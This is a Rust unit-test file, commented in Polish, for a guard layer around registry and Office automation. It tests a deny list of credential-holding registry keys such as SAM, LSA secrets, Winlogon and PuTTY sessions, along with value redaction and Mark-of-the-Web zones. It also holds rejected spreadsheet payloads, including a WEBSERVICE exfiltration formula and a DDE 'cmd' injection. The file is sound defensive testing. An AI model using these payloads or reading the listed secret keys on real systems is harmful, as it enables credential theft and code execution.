//! Testy jednostkowe kontraktu: rejestr (parsowanie, deny-lista, redakcja), formuły i komórki,
//! strefy MOTW, sesja Office.

use proptest::prelude::*;

use super::*;

#[test]
fn registry_key_parsing_and_hives() {
    let k = RegKey::parse(r"HKEY_CURRENT_USER/Software//Microsoft\Notepad ").unwrap();
    assert_eq!(k.hive(), RegHive::CurrentUser);
    assert_eq!(k.to_string(), r"HKCU\Software\Microsoft\Notepad");
    assert_eq!(k.subpath(), r"Software\Microsoft\Notepad");
    let ps = RegKey::parse(r"Registry::HKEY_LOCAL_MACHINE\SOFTWARE").unwrap();
    assert_eq!(ps.to_string(), r"HKLM\SOFTWARE");
    assert_eq!(RegKey::parse(r"HKLM:\SOFTWARE").unwrap(), ps);
    assert!(matches!(
        RegKey::parse(r"HKU\S-1-5-18"),
        Err(RegistryError::UnsupportedHive(_))
    ));
    assert!(matches!(
        RegKey::parse(r"HKCR\.txt"),
        Err(RegistryError::UnsupportedHive(_))
    ));
    for bad in ["", r"HKCU\a\..\b", "HKCU\\a\u{0}b", r"HKCU\."] {
        assert!(RegKey::parse(bad).is_err(), "{bad:?}");
    }
    assert_eq!(RegKey::parse("hkcu").unwrap().subpath(), "");
    assert_eq!(
        k.child("Recent").unwrap().to_string(),
        r"HKCU\Software\Microsoft\Notepad\Recent"
    );
}

#[test]
fn registry_deny_list_covers_secret_keys() {
    for secret in [
        r"HKCU\Software\Microsoft\Credentials",
        r"HKLM\SECURITY\Policy\Secrets",
        r"HKLM\SAM\SAM\Domains",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD",
        r"HKLM\SYSTEM\ControlSet001\Control\LSA",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon",
        r"HKCU\Software\Microsoft\Protected Storage System Provider",
        r"HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2",
        r"HKCU\Software\SimonTatham\PuTTY\Sessions\srv",
        r"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions",
        r"HKCU\Software\ORL\WinVNC3",
        r"HKCU\Software\OpenSSH\Agent\Keys",
        r"HKCU\Software\Alfa",
        r"HKCU\Software\Acme\SavedPasswords",
        r"HKCU\Software\Acme\ApiTokens",
    ] {
        let k = RegKey::parse(secret).unwrap();
        assert!(k.is_secret(), "{secret}");
        assert!(matches!(check_key(&k), Err(RegistryError::Denied(_))));
    }
    for ok in [
        r"HKCU\Software\Microsoft\Notepad",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
        r"HKCU\Control Panel\Desktop",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
    ] {
        assert!(check_key(&RegKey::parse(ok).unwrap()).is_ok(), "{ok}");
    }
}

#[test]
fn registry_values_and_listing_are_guarded() {
    let v = RegValue {
        name: "DefaultPassword".into(),
        data: RegData::String("tajne".into()),
    };
    assert_eq!(v.guarded().data, RegData::Redacted);
    let long = RegValue {
        name: "Opis".into(),
        data: RegData::String("x".repeat(MAX_REG_DATA_CHARS + 10)),
    }
    .guarded();
    assert!(matches!(long.data, RegData::String(s) if s.len() == MAX_REG_DATA_CHARS));
    assert!(
        matches!(RegData::binary(&[0xab; 300]), RegData::Binary { bytes: 300, hex } if hex.len() == 512)
    );
    let key = RegKey::parse(r"HKCU\Software\Microsoft").unwrap();
    let listing = RegListing {
        key: String::new(),
        subkeys: vec!["Notepad".into(), "Credentials".into(), "IdentityCRL".into()],
        values: vec![
            RegValue {
                name: "ApiKey".into(),
                data: RegData::String("k".into()),
            },
            RegValue {
                name: "Wersja".into(),
                data: RegData::Dword(3),
            },
        ],
        hidden_subkeys: 0,
        truncated: false,
    };
    let g = guard_listing(&key, listing.clone(), 100);
    assert_eq!(g.subkeys, vec!["Notepad".to_owned()]);
    assert_eq!(g.hidden_subkeys, 2);
    assert_eq!(g.values[0].data, RegData::Redacted);
    assert_eq!(g.key, r"HKCU\Software\Microsoft");
    let small = guard_listing(&key, listing, 2);
    assert!(small.truncated && small.subkeys.len() + small.values.len() == 2);
    let json = serde_json::to_value(RegData::Dword(7)).unwrap();
    assert_eq!(json, serde_json::json!({"type": "dword", "value": 7}));
}

proptest! {
    /// Dowolna pisownia (wielkość liter, separatory, prefiksy, spacje) klucza z sekretami → odmowa.
    #[test]
    fn secret_keys_denied_in_any_spelling(
        idx in 0usize..6,
        upper in proptest::collection::vec(any::<bool>(), 64),
        slash in any::<bool>(),
        long_hive in any::<bool>(),
        tail in "[A-Za-z0-9 ]{0,12}",
    ) {
        let bases = [
            ("HKCU", r"Software\Microsoft\Credentials"),
            ("HKLM", r"SECURITY\Policy\Secrets"),
            ("HKLM", r"SYSTEM\CurrentControlSet\Control\Lsa"),
            ("HKLM", r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"),
            ("HKCU", r"Software\SimonTatham\PuTTY"),
            ("HKLM", r"SAM\SAM"),
        ];
        let (hive, path) = bases[idx];
        let hive = match (hive, long_hive) {
            ("HKCU", true) => "HKEY_CURRENT_USER",
            ("HKLM", true) => "HKEY_LOCAL_MACHINE",
            (h, _) => h,
        };
        let mut raw = format!(r"{hive}\{path}\{tail}");
        raw = raw
            .chars()
            .zip(upper.iter().cycle())
            .map(|(c, u)| if *u { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() })
            .collect();
        if slash {
            raw = raw.replace('\\', "/");
        }
        let key = RegKey::parse(&raw).unwrap();
        prop_assert!(check_key(&key).is_err());
    }
}

#[test]
fn formulas_allowlist_blocks_exfiltration_and_dde() {
    for ok in [
        "=SUM(A1:A3)",
        "=IF(B2>0,\"tak\",\"nie\")",
        "=xlookup(A1,Arkusz2!A:A,Arkusz2!B:B)",
        "=_xlfn.XLOOKUP(A1,B:B,C:C)",
        "=STDEV.S(A1:A9)*2",
        "=TEXTJOIN(\"|\",TRUE,A1:A3)",
        "=A1+B1",
    ] {
        assert!(check_formula(ok).is_ok(), "{ok}");
    }
    for bad in [
        "=WEBSERVICE(\"http://x/?\"&A1)",
        "=cmd|' /C calc'!A0",
        "=HYPERLINK(\"http://x\",\"klik\")",
        "=IMAGE(\"https://x/a.png\")",
        "=STOCKHISTORY(\"MSFT\",TODAY())",
        "=CALL(\"kernel32\",\"x\")",
        "=PY(\"print(1)\")",
        "='C:\\x\\[a.xlsx]Arkusz1'!A1",
        "=[a.xlsx]Arkusz1!A1",
        "=INDIRECT(\"A1\")",
        "=INFO(\"directory\")",
        "SUM(A1)",
        "=SUM(\"a)",
        "=",
    ] {
        assert!(check_formula(bad).is_err(), "{bad}");
    }
    assert!(is_allowed_function("vlookup") && !is_allowed_function("WEBSERVICE"));
}

#[test]
fn cells_and_sheets() {
    assert_eq!(parse_cell("A1"), Some((1, 1)));
    assert_eq!(parse_cell("$AB$12"), Some((28, 12)));
    assert_eq!(parse_cell("XFD1048576"), Some((16_384, 1_048_576)));
    assert_eq!(parse_cell("XFE1"), None);
    assert_eq!(parse_cell("A0"), None);
    assert_eq!(parse_cell("1A"), None);
    assert_eq!(parse_range("C3:A1"), Some(((1, 1), (3, 3))));
    assert_eq!(parse_range("B2"), Some(((2, 2), (2, 2))));
    for (c, r) in [(1, 1), (26, 5), (27, 9), (702, 1), (703, 2), (16_384, 3)] {
        assert_eq!(parse_cell(&cell_name(c, r)), Some((c, r)));
    }
    assert_eq!(cell_name(28, 4), "AB4");
    assert_eq!(safe_cell_text("=1+1"), "'=1+1");
    assert_eq!(safe_cell_text("-5 zł"), "'-5 zł");
    assert_eq!(safe_cell_text("Zwykły"), "Zwykły");
    assert!(check_sheet_name("Dane 2026").is_ok());
    for bad in ["", "a/b", "[x]", "History", &"x".repeat(32), "'a"] {
        assert!(check_sheet_name(bad).is_err(), "{bad}");
    }
}

#[test]
fn office_files_zones_and_sessions() {
    assert_eq!(app_for_file("Raport.DOCX"), Some(OfficeApp::Word));
    assert_eq!(app_for_file("b.xlsm"), Some(OfficeApp::Excel));
    assert_eq!(app_for_file("szablon.dotm"), None);
    assert_eq!(app_for_file("dodatek.xlam"), None);
    assert_eq!(app_for_file("bez"), None);
    let f = OfficeFile::new(r"C:\x\Raport.docx", vec![1], FileZone::Local).unwrap();
    assert_eq!(f.file_name, "Raport.docx");
    assert!(OfficeFile::new("~$Raport.docx", vec![], FileZone::Local).is_err());
    assert!(OfficeFile::new("a.exe", vec![], FileZone::Local).is_err());
    assert!(
        OfficeFile::new("evil:a.docx", vec![], FileZone::Local).is_err(),
        "strumień ADS"
    );
    assert_eq!(
        FileZone::from_zone_identifier("[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://x"),
        FileZone::Internet
    );
    assert_eq!(FileZone::from_zone_identifier("ZoneId=0"), FileZone::Local);
    assert_eq!(FileZone::from_zone_identifier("śmieci"), FileZone::Internet);
    assert_eq!(FileZone::from_zone_id(9), FileZone::Restricted);
    assert!(FileZone::Restricted.is_untrusted() && !FileZone::Trusted.is_untrusted());
    let mut s = OfficeSession {
        automation_security: AUTOMATION_SECURITY_FORCE_DISABLE,
        protected_view: false,
        macros_present: true,
        shared_instance: false,
    };
    assert!(check_session(&s).is_ok());
    s.automation_security = 1;
    assert!(matches!(check_session(&s), Err(OfficeError::Policy(m)) if m.contains("makra")));
    assert_eq!(OfficeApp::Excel.exe(), "excel.exe");
    assert_eq!(OfficeApp::Word.prog_id(), "Word.Application");
}

#[test]
fn office_edits_are_validated() {
    let word = OfficeFile::new("a.docx", vec![], FileZone::Local).unwrap();
    let excel = OfficeFile::new("a.xlsx", vec![], FileZone::Local).unwrap();
    let text = OfficeEdit::InsertText {
        position: TextPosition::End,
        text: "Akapit".into(),
    };
    assert!(check_edits(&word, std::slice::from_ref(&text)).is_ok());
    assert!(matches!(
        check_edits(&excel, std::slice::from_ref(&text)),
        Err(OfficeError::Unsupported(_))
    ));
    assert!(check_edits(&word, &[]).is_err());
    let mut web = word.clone();
    web.zone = FileZone::Internet;
    assert_eq!(
        check_edits(&web, std::slice::from_ref(&text)),
        Err(OfficeError::ProtectedView)
    );
    let cells = |rows: Vec<Vec<CellInput>>| OfficeEdit::SetCells {
        sheet: Some("Dane".into()),
        start: "B2".into(),
        rows,
    };
    assert!(
        cells(vec![vec![
            CellInput::Number(1.0),
            CellInput::Formula("=B2*2".into())
        ]])
        .validate()
        .is_ok()
    );
    assert!(
        cells(vec![vec![CellInput::Formula("=WEBSERVICE(\"x\")".into())]])
            .validate()
            .is_err()
    );
    assert!(
        cells(vec![vec![CellInput::Number(f64::NAN)]])
            .validate()
            .is_err()
    );
    assert!(cells(vec![]).validate().is_err());
    let big = OfficeEdit::SetCells {
        sheet: None,
        start: "XFD1".into(),
        rows: vec![vec![CellInput::Clear, CellInput::Clear]],
    };
    assert!(big.validate().is_err());
    assert!(
        OfficeEdit::AddSheet { name: "a:b".into() }
            .validate()
            .is_err()
    );
    let table = OfficeEdit::InsertTable {
        position: TextPosition::Start,
        rows: vec![vec!["a".into(), "b".into()], vec!["1".into(), "2".into()]],
    };
    assert!(table.validate().is_ok());
    let replace = OfficeEdit::ReplaceText {
        find: String::new(),
        replace: "x".into(),
        all: true,
    };
    assert!(replace.validate().is_err());
    let json = serde_json::to_value(cells(vec![vec![CellInput::Text("=x".into())]])).unwrap();
    assert_eq!(json["op"], "set_cells");
    assert_eq!(
        json["rows"][0][0],
        serde_json::json!({"kind": "text", "value": "=x"})
    );
    let values = serde_json::to_value(vec![
        CellValue::Empty,
        CellValue::Number(1.5),
        CellValue::Bool(true),
        CellValue::Text("a".into()),
        CellValue::Error {
            error: "#DIV/0!".into(),
        },
    ])
    .unwrap();
    assert_eq!(
        values,
        serde_json::json!([null, 1.5, true, "a", {"error": "#DIV/0!"}])
    );
}
